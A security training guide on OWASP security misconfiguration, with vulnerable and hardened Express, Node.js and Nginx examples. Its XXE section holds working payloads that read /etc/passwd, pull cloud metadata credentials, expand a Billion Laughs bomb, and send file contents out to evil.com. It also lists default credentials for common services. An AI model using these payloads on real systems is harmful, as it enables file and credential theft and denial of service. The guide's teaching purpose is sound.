---
title: "A05: Security Misconfiguration"
description: Comprehensive coverage of security misconfiguration vulnerabilities including default credentials, unnecessary features, verbose errors, missing security headers, XXE, and directory listing with hardening checklists for Node.js, Express, and Nginx
tags: [security, owasp, misconfiguration, hardening, security-headers, xxe, nginx, express]
difficulty: advanced
prerequisites:
  - owasp/index
  - Node.js and Express.js familiarity
  - Basic Nginx configuration knowledge
lastReviewed: "2026-03-17"
---

# A05: Security Misconfiguration

Security misconfiguration is the most commonly seen issue in the OWASP Top 10. It is frequently the result of insecure default configurations, incomplete or ad-hoc configurations, open cloud storage, misconfigured HTTP headers, verbose error messages containing sensitive information, or unnecessary services, pages, accounts, or privileges left enabled.

## 1. Default Credentials

Default credentials are the most basic security misconfiguration. Many services ship with well-known default usernames and passwords. If these are not changed before deployment, attackers can gain access simply by trying the defaults.

### Common Default Credentials

| Service | Default Username | Default Password |
|---------|-----------------|------------------|
| MongoDB | (no auth required) | (no auth required) |
| Redis | (no auth required) | (no auth required) |
| Elasticsearch | elastic | changeme |
| RabbitMQ | guest | guest |
| Jenkins | admin | (generated on first run) |
| Grafana | admin | admin |
| pgAdmin | admin@admin.com | admin |
| MySQL | root | (empty) |
| phpMyAdmin | root | (empty) |
| Spring Boot Actuator | (no auth by default) | (no auth by default) |

### Detection

```typescript
// Automated check for default credentials
interface CredentialCheck {
  service: string;
  host: string;
  port: number;
  defaultCredentials: Array<{ username: string; password: string }>;
}

const checks: CredentialCheck[] = [
  {
    service: 'MongoDB',
    host: 'localhost',
    port: 27017,
    defaultCredentials: [
      { username: '', password: '' }, // No auth
    ],
  },
  {
    service: 'Redis',
    host: 'localhost',
    port: 6379,
    defaultCredentials: [
      { username: '', password: '' }, // No auth
    ],
  },
  {
    service: 'RabbitMQ',
    host: 'localhost',
    port: 15672,
    defaultCredentials: [
      { username: 'guest', password: 'guest' },
    ],
  },
];

// Run this as part of your deployment verification
async function checkDefaultCredentials(checks: CredentialCheck[]): Promise<void> {
  for (const check of checks) {
    for (const cred of check.defaultCredentials) {
      const vulnerable = await testCredentials(check.service, check.host, check.port, cred);
      if (vulnerable) {
        logger.error(`DEFAULT CREDENTIALS DETECTED: ${check.service} at ${check.host}:${check.port}`);
        throw new Error(`Default credentials found on ${check.service}`);
      }
    }
  }
}
```

### Prevention

```bash
# MongoDB: Enable authentication
mongosh --eval 'db.createUser({user:"admin",pwd:passwordPrompt(),roles:["root"]})'

# Redis: Set a password
# In redis.conf:
# requirepass YOUR_STRONG_PASSWORD_HERE
# rename-command CONFIG ""
# rename-command FLUSHALL ""
# rename-command FLUSHDB ""

# Elasticsearch: Enable security
# In elasticsearch.yml:
# xpack.security.enabled: true
# xpack.security.transport.ssl.enabled: true
```

---

## 2. Unnecessary Features and Services

Unused features increase the attack surface. Every enabled feature, open port, and installed package is a potential entry point for attackers.

### Vulnerable Configuration

```typescript
// VULNERABLE: Express with unnecessary middleware
import express from 'express';

const app = express();

// Debug routes left in production
app.get('/debug/env', (req, res) => {
  res.json(process.env); // Exposes ALL environment variables
});

app.get('/debug/heap', (req, res) => {
  const usage = process.memoryUsage();
  res.json(usage);
});

// Stack traces in error responses
app.use((err: Error, req: express.Request, res: express.Response, next: express.NextFunction) => {
  res.status(500).json({
    error: err.message,
    stack: err.stack, // Full stack trace exposed
  });
});

// x-powered-by header reveals technology
// Express sends "X-Powered-By: Express" by default
```

### Secure Configuration

```typescript
import express from 'express';
import helmet from 'helmet';

const app = express();

// Remove the X-Powered-By header
app.disable('x-powered-by');

// Or use helmet which does this automatically along with other headers
app.use(helmet());

// Remove debug routes in production
if (process.env.NODE_ENV !== 'production') {
  app.get('/debug/env', requireRole('developer'), (req, res) => {
    // Even in dev, only show non-sensitive env vars
    const safeVars = Object.fromEntries(
      Object.entries(process.env).filter(
        ([key]) => !key.match(/SECRET|PASSWORD|KEY|TOKEN|CREDENTIAL/i)
      )
    );
    res.json(safeVars);
  });
}

// Production error handler — never expose stack traces
app.use((err: Error, req: express.Request, res: express.Response, next: express.NextFunction) => {
  const requestId = req.headers['x-request-id'] || crypto.randomUUID();

  // Log the full error internally
  logger.error('Unhandled error', {
    requestId,
    error: err.message,
    stack: err.stack,
    path: req.path,
    method: req.method,
    userId: (req as any).user?.id,
  });

  // Return a generic error to the client
  res.status(500).json({
    error: 'Internal server error',
    requestId, // Include request ID so support can correlate
  });
});
```

---

## 3. Verbose Error Messages

Error messages that reveal implementation details help attackers understand the system architecture, identify technologies, and craft targeted attacks.

### Vulnerable Error Responses

```json
// Database error exposed to client
{
  "error": "SequelizeDatabaseError: relation \"users\" does not exist",
  "sql": "SELECT * FROM users WHERE email = 'test@example.com'",
  "stack": "Error\n    at Query.run (/app/node_modules/sequelize/...)"
}

// Authentication error revealing user existence
{
  "error": "Password incorrect for user admin@example.com"
}
// vs.
{
  "error": "No account found with email hacker@evil.com"
}
// The different messages reveal whether an email is registered

// Version information in error
{
  "error": "Error in Express 4.18.2 / Node.js v18.17.0"
}
```

### Secure Error Handling

```typescript
// Centralized error handling with classification
enum ErrorType {
  VALIDATION = 'VALIDATION',
  AUTHENTICATION = 'AUTHENTICATION',
  AUTHORIZATION = 'AUTHORIZATION',
  NOT_FOUND = 'NOT_FOUND',
  CONFLICT = 'CONFLICT',
  RATE_LIMIT = 'RATE_LIMIT',
  INTERNAL = 'INTERNAL',
}

class AppError extends Error {
  public readonly type: ErrorType;
  public readonly statusCode: number;
  public readonly isOperational: boolean;

  constructor(
    type: ErrorType,
    message: string,
    statusCode: number,
    isOperational: boolean = true
  ) {
    super(message);
    this.type = type;
    this.statusCode = statusCode;
    this.isOperational = isOperational;
  }
}

// Map error types to client-safe messages
const ERROR_MESSAGES: Record<ErrorType, string> = {
  [ErrorType.VALIDATION]: 'Invalid request data',
  [ErrorType.AUTHENTICATION]: 'Invalid credentials',
  [ErrorType.AUTHORIZATION]: 'Forbidden',
  [ErrorType.NOT_FOUND]: 'Resource not found',
  [ErrorType.CONFLICT]: 'Resource conflict',
  [ErrorType.RATE_LIMIT]: 'Too many requests',
  [ErrorType.INTERNAL]: 'Internal server error',
};

app.use((err: Error, req: express.Request, res: express.Response, next: express.NextFunction) => {
  const requestId = crypto.randomUUID();

  if (err instanceof AppError && err.isOperational) {
    // Operational errors — safe to show type to client
    logger.warn('Operational error', {
      requestId,
      type: err.type,
      message: err.message,
      path: req.path,
    });

    return res.status(err.statusCode).json({
      error: ERROR_MESSAGES[err.type],
      requestId,
    });
  }

  // Programming errors — log full details, show generic message
  logger.error('Unexpected error', {
    requestId,
    error: err.message,
    stack: err.stack,
    path: req.path,
    method: req.method,
  });

  res.status(500).json({
    error: 'Internal server error',
    requestId,
  });
});

// SECURE: Generic authentication error — same message for wrong email AND wrong password
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;

  const user = await findUserByEmail(email);

  if (!user) {
    // Dummy hash to prevent timing attack
    await argon2.hash(password);
    throw new AppError(ErrorType.AUTHENTICATION, 'Invalid credentials', 401);
  }

  const valid = await argon2.verify(user.passwordHash, password);

  if (!valid) {
    throw new AppError(ErrorType.AUTHENTICATION, 'Invalid credentials', 401);
  }

  // ... generate token
});
```

---

## 4. Missing Security Headers

HTTP security headers instruct browsers to enable or disable specific security features. Missing headers leave users vulnerable to various attacks.

### Complete Security Headers Configuration

```typescript
import helmet from 'helmet';
import crypto from 'crypto';

// Generate a nonce for each request (for CSP)
app.use((req, res, next) => {
  res.locals.cspNonce = crypto.randomBytes(16).toString('base64');
  next();
});

app.use(
  helmet({
    // Content Security Policy
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: [
          "'self'",
          (req: any, res: any) => `'nonce-${res.locals.cspNonce}'`,
        ],
        styleSrc: [
          "'self'",
          (req: any, res: any) => `'nonce-${res.locals.cspNonce}'`,
        ],
        imgSrc: ["'self'", 'data:', 'https:'],
        fontSrc: ["'self'"],
        connectSrc: ["'self'", 'https://api.example.com'],
        frameSrc: ["'none'"],
        objectSrc: ["'none'"],
        baseUri: ["'self'"],
        formAction: ["'self'"],
        frameAncestors: ["'none'"],
        upgradeInsecureRequests: [],
      },
    },

    // Strict-Transport-Security
    hsts: {
      maxAge: 31536000,        // 1 year in seconds
      includeSubDomains: true,
      preload: true,
    },

    // X-Content-Type-Options: nosniff
    // Prevents MIME type sniffing
    noSniff: true,

    // Referrer-Policy
    referrerPolicy: {
      policy: 'strict-origin-when-cross-origin',
    },

    // X-Frame-Options
    frameguard: {
      action: 'deny',
    },

    // X-DNS-Prefetch-Control
    dnsPrefetchControl: {
      allow: false,
    },

    // X-Download-Options (IE-specific)
    ieNoOpen: true,

    // X-Permitted-Cross-Domain-Policies
    permittedCrossDomainPolicies: {
      permittedPolicies: 'none',
    },

    // Disable X-Powered-By
    hidePoweredBy: true,

    // Cross-Origin-Opener-Policy
    crossOriginOpenerPolicy: {
      policy: 'same-origin',
    },

    // Cross-Origin-Resource-Policy
    crossOriginResourcePolicy: {
      policy: 'same-origin',
    },

    // Cross-Origin-Embedder-Policy
    crossOriginEmbedderPolicy: {
      policy: 'require-corp',
    },

    // Origin-Agent-Cluster
    originAgentCluster: true,
  })
);

// Additional headers not covered by helmet
app.use((req, res, next) => {
  // Permissions Policy (formerly Feature Policy)
  res.setHeader('Permissions-Policy',
    'accelerometer=(), camera=(), geolocation=(), gyroscope=(), magnetometer=(), microphone=(), payment=(), usb=()'
  );

  // Cache-Control for sensitive pages
  if (req.path.startsWith('/api/') || req.path.startsWith('/account')) {
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');
  }

  next();
});
```

### Security Headers Reference

| Header | Purpose | Recommended Value |
|--------|---------|-------------------|
| `Content-Security-Policy` | Prevent XSS, data injection | See CSP section |
| `Strict-Transport-Security` | Force HTTPS | `max-age=31536000; includeSubDomains; preload` |
| `X-Content-Type-Options` | Prevent MIME sniffing | `nosniff` |
| `X-Frame-Options` | Prevent clickjacking | `DENY` |
| `Referrer-Policy` | Control referrer information | `strict-origin-when-cross-origin` |
| `Permissions-Policy` | Disable browser features | Disable unused features |
| `Cross-Origin-Opener-Policy` | Isolate browsing context | `same-origin` |
| `Cross-Origin-Resource-Policy` | Prevent cross-origin reads | `same-origin` |
| `Cache-Control` | Prevent caching of sensitive data | `no-store` |

---

## 5. XML External Entity (XXE) Attacks

XXE attacks exploit XML parsers that process external entity references. An attacker can use XXE to read arbitrary files, perform SSRF, or cause denial of service.

### Vulnerable Code

```typescript
import { parseString } from 'xml2js';
import libxmljs from 'libxmljs';

// VULNERABLE: XML parser with external entities enabled
app.post('/api/import', (req: Request, res: Response) => {
  const xmlData = req.body;

  // xml2js is generally safe by default, but some parsers are not
  parseString(xmlData, (err, result) => {
    if (err) {
      return res.status(400).json({ error: 'Invalid XML' });
    }
    res.json(result);
  });
});

// VULNERABLE: libxmljs with default settings allows external entities
app.post('/api/parse', (req: Request, res: Response) => {
  const doc = libxmljs.parseXml(req.body.toString(), {
    // External entities are enabled by default in some configurations
    noent: true,    // Expand entities — DANGEROUS
    dtdload: true,  // Load DTDs — DANGEROUS
  });

  res.json({ root: doc.root()?.name() });
});
```

### Exploitation

```xml
<!-- File disclosure via external entity -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<order>
  <item>&xxe;</item>
</order>

<!-- SSRF via external entity -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<order>
  <item>&xxe;</item>
</order>

<!-- Billion Laughs DoS (entity expansion bomb) -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<data>&lol9;</data>
<!-- Expands to ~3 GB of "lol" strings from a few hundred bytes of XML -->

<!-- Blind XXE with out-of-band data exfiltration -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://evil.com/xxe.dtd">
  %dtd;
]>
<data>&send;</data>

<!-- evil.com/xxe.dtd contains: -->
<!-- <!ENTITY % all "<!ENTITY send SYSTEM 'http://evil.com/collect?data=%file;'>"> -->
<!-- %all; -->
```

### Secure Code

```typescript
import { parseString } from 'xml2js';

// SECURE: Disable DTDs and external entities
app.post('/api/import', (req: Request, res: Response) => {
  const xmlData = req.body;

  // Quick check: reject XML with DOCTYPE declarations
  if (xmlData.includes('<!DOCTYPE') || xmlData.includes('<!ENTITY')) {
    return res.status(400).json({ error: 'DTD declarations are not allowed' });
  }

  parseString(xmlData, {
    explicitRoot: true,
    // xml2js options to prevent XXE
    // xml2js uses sax parser internally, which doesn't process external entities
    // but we add explicit checks for defense in depth
  }, (err, result) => {
    if (err) {
      return res.status(400).json({ error: 'Invalid XML' });
    }
    res.json(result);
  });
});

// BETTER: Use JSON instead of XML wherever possible
app.post('/api/import-json', (req: Request, res: Response) => {
  // JSON has no equivalent of external entities
  const data = req.body; // express.json() middleware parses safely
  res.json(data);
});

// If you must use libxmljs:
import libxmljs from 'libxmljs';

app.post('/api/parse-safe', (req: Request, res: Response) => {
  try {
    const doc = libxmljs.parseXml(req.body.toString(), {
      noent: false,     // Do NOT expand entities
      dtdload: false,   // Do NOT load DTDs
      dtdvalid: false,  // Do NOT validate against DTD
      nonet: true,      // Do NOT allow network access
      nocdata: false,
      noblanks: true,
    });

    res.json({ root: doc.root()?.name() });
  } catch (err) {
    res.status(400).json({ error: 'Invalid XML' });
  }
});
```

---

## 6. Directory Listing

When directory listing is enabled on a web server, attackers can browse the server's file structure and discover sensitive files.

### Nginx — Disable Directory Listing

```nginx
# VULNERABLE
server {
    listen 80;
    server_name example.com;

    location / {
        root /var/www/html;
        autoindex on;  # DANGEROUS: enables directory listing
    }
}

# SECURE
server {
    listen 443 ssl http2;
    server_name example.com;

    location / {
        root /var/www/html;
        autoindex off;  # Disable directory listing (this is the default)
        index index.html;

        # Return 404 for missing files instead of showing directory
        try_files $uri $uri/ =404;
    }

    # Block access to hidden files and directories
    location ~ /\. {
        deny all;
        return 404;
    }

    # Block access to sensitive file types
    location ~* \.(env|git|sql|bak|log|yml|yaml|toml|ini|conf|config|sh)$ {
        deny all;
        return 404;
    }

    # Block access to common sensitive paths
    location ~* ^/(\.git|\.env|\.svn|\.hg|wp-admin|phpMyAdmin|adminer) {
        deny all;
        return 404;
    }
}
```

---

## Node.js Hardening Checklist

```typescript
// 1. Set NODE_ENV to production
// Ensures Express uses production defaults and disables debug features
if (process.env.NODE_ENV !== 'production') {
  throw new Error('NODE_ENV must be "production" in production');
}

// 2. Limit request body size
app.use(express.json({ limit: '100kb' }));
app.use(express.urlencoded({ extended: false, limit: '100kb' }));

// 3. Set request timeout
import { createServer } from 'http';
const server = createServer(app);
server.timeout = 30000;        // 30 seconds
server.headersTimeout = 31000; // Slightly more than timeout
server.keepAliveTimeout = 5000;

// 4. Disable unnecessary HTTP methods
app.use((req, res, next) => {
  const allowedMethods = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS', 'HEAD'];
  if (!allowedMethods.includes(req.method)) {
    return res.status(405).json({ error: 'Method not allowed' });
  }
  next();
});

// 5. Prevent parameter pollution
import hpp from 'hpp';
app.use(hpp());

// 6. Limit URL and header size
const server = createServer({
  maxHeaderSize: 8192,        // 8 KB (default is 16 KB)
}, app);

// 7. Use process-level security
// Run Node.js as a non-root user
// Use --frozen-intrinsics flag to prevent prototype pollution
// node --frozen-intrinsics app.js

// 8. Configure trust proxy correctly
// Only trust the specific proxy IPs, not all proxies
app.set('trust proxy', ['loopback', '10.0.0.0/8']);
// NEVER use: app.set('trust proxy', true); // Trusts ALL proxies

// 9. Enforce HTTPS in production
app.use((req, res, next) => {
  if (
    process.env.NODE_ENV === 'production' &&
    req.headers['x-forwarded-proto'] !== 'https'
  ) {
    return res.redirect(301, `https://${req.hostname}${req.url}`);
  }
  next();
});

// 10. Set secure cookie defaults
app.use(session({
  secret: process.env.SESSION_SECRET!,
  name: '__Host-sid',  // __Host- prefix enforces secure + path=/
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: true,
    httpOnly: true,
    sameSite: 'strict',
    maxAge: 3600000,     // 1 hour
    path: '/',
    domain: undefined,   // Don't set domain — defaults to exact host
  },
  store: new RedisStore({ client: redisClient }),
}));
```

---

## Express.js Hardening Checklist

```typescript
import express from 'express';
import helmet from 'helmet';
import cors from 'cors';
import rateLimit from 'express-rate-limit';
import compression from 'compression';

const app = express();

// ═══════════════════════════════════════════════════════
// 1. DISABLE DANGEROUS DEFAULTS
// ═══════════════════════════════════════════════════════
app.disable('x-powered-by');
app.disable('etag'); // Prevent information leakage via ETags

// ═══════════════════════════════════════════════════════
// 2. SECURITY HEADERS (helmet)
// ═══════════════════════════════════════════════════════
app.use(helmet(/* see security headers section above */));

// ═══════════════════════════════════════════════════════
// 3. CORS — STRICT ALLOWLIST
// ═══════════════════════════════════════════════════════
const ALLOWED_ORIGINS = new Set([
  'https://app.example.com',
  'https://admin.example.com',
]);

app.use(cors({
  origin: (origin, callback) => {
    if (!origin || ALLOWED_ORIGINS.has(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
  maxAge: 86400,
}));

// ═══════════════════════════════════════════════════════
// 4. RATE LIMITING
// ═══════════════════════════════════════════════════════
const globalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100,
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'Too many requests' },
});

const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 10, // Stricter for auth endpoints
  skipSuccessfulRequests: true,
  message: { error: 'Too many authentication attempts' },
});

app.use(globalLimiter);
app.use('/api/auth', authLimiter);

// ═══════════════════════════════════════════════════════
// 5. BODY PARSING LIMITS
// ═══════════════════════════════════════════════════════
app.use(express.json({ limit: '100kb' }));
app.use(express.urlencoded({ extended: false, limit: '100kb', parameterLimit: 50 }));

// ═══════════════════════════════════════════════════════
// 6. COMPRESSION (with security consideration)
// ═══════════════════════════════════════════════════════
app.use(compression({
  filter: (req, res) => {
    // Don't compress responses that include secrets
    // BREACH attack exploits compression + CSRF to extract secrets
    if (req.headers['x-no-compression']) return false;
    return compression.filter(req, res);
  },
  threshold: 1024, // Only compress responses larger than 1 KB
}));

// ═══════════════════════════════════════════════════════
// 7. REQUEST ID FOR TRACING
// ═══════════════════════════════════════════════════════
app.use((req, res, next) => {
  const requestId = req.headers['x-request-id'] as string || crypto.randomUUID();
  req.headers['x-request-id'] = requestId;
  res.setHeader('X-Request-ID', requestId);
  next();
});
```

---

## Nginx Hardening Configuration

```nginx
# /etc/nginx/nginx.conf

user nginx;
worker_processes auto;
pid /run/nginx.pid;

events {
    worker_connections 1024;
    multi_accept on;
}

http {
    # ═══════════════════════════════════════════
    # BASIC SECURITY
    # ═══════════════════════════════════════════

    # Hide Nginx version
    server_tokens off;

    # Prevent clickjacking
    add_header X-Frame-Options "DENY" always;

    # Prevent MIME type sniffing
    add_header X-Content-Type-Options "nosniff" always;

    # XSS protection
    add_header X-XSS-Protection "0" always;
    # Note: X-XSS-Protection is deprecated; use CSP instead

    # Referrer policy
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;

    # Permissions policy
    add_header Permissions-Policy "camera=(), microphone=(), geolocation=(), payment=()" always;

    # HSTS
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;

    # ═══════════════════════════════════════════
    # SSL/TLS
    # ═══════════════════════════════════════════

    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384';
    ssl_prefer_server_ciphers on;
    ssl_session_timeout 1d;
    ssl_session_cache shared:SSL:50m;
    ssl_session_tickets off;

    # OCSP stapling
    ssl_stapling on;
    ssl_stapling_verify on;
    resolver 1.1.1.1 8.8.8.8 valid=300s;
    resolver_timeout 5s;

    # DH parameters (generate with: openssl dhparam -out /etc/nginx/dhparam.pem 4096)
    ssl_dhparam /etc/nginx/dhparam.pem;

    # ═══════════════════════════════════════════
    # REQUEST LIMITS
    # ═══════════════════════════════════════════

    # Limit request body size
    client_max_body_size 10m;

    # Limit buffer sizes
    client_body_buffer_size 16k;
    client_header_buffer_size 1k;
    large_client_header_buffers 4 8k;

    # Timeouts
    client_body_timeout 12;
    client_header_timeout 12;
    keepalive_timeout 15;
    send_timeout 10;

    # Rate limiting zones
    limit_req_zone $binary_remote_addr zone=general:10m rate=10r/s;
    limit_req_zone $binary_remote_addr zone=login:10m rate=1r/s;
    limit_req_zone $binary_remote_addr zone=api:10m rate=30r/s;

    # Connection limiting
    limit_conn_zone $binary_remote_addr zone=addr:10m;

    # ═══════════════════════════════════════════
    # LOGGING
    # ═══════════════════════════════════════════

    # Custom log format with security-relevant fields
    log_format security '$remote_addr - $remote_user [$time_local] '
                        '"$request" $status $body_bytes_sent '
                        '"$http_referer" "$http_user_agent" '
                        '$request_time $upstream_response_time '
                        '$ssl_protocol $ssl_cipher';

    access_log /var/log/nginx/access.log security;
    error_log /var/log/nginx/error.log warn;

    # ═══════════════════════════════════════════
    # SERVER BLOCK
    # ═══════════════════════════════════════════

    # Redirect HTTP to HTTPS
    server {
        listen 80;
        server_name example.com www.example.com;
        return 301 https://$server_name$request_uri;
    }

    # Default server — reject requests without valid Host header
    server {
        listen 443 ssl default_server;
        server_name _;
        ssl_certificate /etc/nginx/ssl/default.crt;
        ssl_certificate_key /etc/nginx/ssl/default.key;
        return 444; # Close connection without response
    }

    # Application server
    server {
        listen 443 ssl http2;
        server_name example.com;

        ssl_certificate /etc/nginx/ssl/example.com.crt;
        ssl_certificate_key /etc/nginx/ssl/example.com.key;

        # Rate limiting
        limit_req zone=general burst=20 nodelay;
        limit_conn addr 10;

        # Block access to hidden files
        location ~ /\. {
            deny all;
            return 404;
        }

        # Block access to sensitive files
        location ~* \.(env|git|sql|bak|log|yml|yaml|toml|ini|conf)$ {
            deny all;
            return 404;
        }

        # API proxy
        location /api/ {
            limit_req zone=api burst=50 nodelay;

            proxy_pass http://127.0.0.1:3000;
            proxy_http_version 1.1;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
            proxy_set_header X-Request-ID $request_id;

            # Prevent request smuggling
            proxy_set_header Connection "";

            # Timeouts
            proxy_connect_timeout 5s;
            proxy_send_timeout 30s;
            proxy_read_timeout 30s;
        }

        # Login endpoint with strict rate limiting
        location /api/auth/login {
            limit_req zone=login burst=5 nodelay;
            proxy_pass http://127.0.0.1:3000;
            proxy_http_version 1.1;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
        }

        # Static files with caching
        location /static/ {
            root /var/www;
            expires 1y;
            add_header Cache-Control "public, immutable";
            access_log off;
        }
    }
}
```

---

## Prevention Checklist

- [ ] Change all default credentials before deployment
- [ ] Remove debug endpoints and test accounts from production
- [ ] Disable unnecessary HTTP methods, features, and services
- [ ] Set all security headers (CSP, HSTS, X-Content-Type-Options, etc.)
- [ ] Return generic error messages — log details server-side only
- [ ] Disable XML external entity processing
- [ ] Disable directory listing on web servers
- [ ] Harden Node.js, Express, and Nginx configurations
- [ ] Set request body size limits and timeouts
- [ ] Implement rate limiting on all public endpoints
- [ ] Use `helmet` middleware in Express applications
- [ ] Hide technology information (X-Powered-By, Server header, stack traces)
- [ ] Run automated configuration scanners (Mozilla Observatory, SSL Labs, SecurityHeaders.com)
- [ ] Review configurations as part of the deployment pipeline
- [ ] Maintain a hardening baseline and drift detection

## References

- CWE-2: Environmental Security Flaws
- CWE-16: Configuration
- CWE-388: Error Handling
- CWE-611: Improper Restriction of XML External Entity Reference
- OWASP Secure Headers Project
- Mozilla Web Security Guidelines
- CIS Benchmarks for Node.js and Nginx
- NIST SP 800-123: Guide to General Server Security
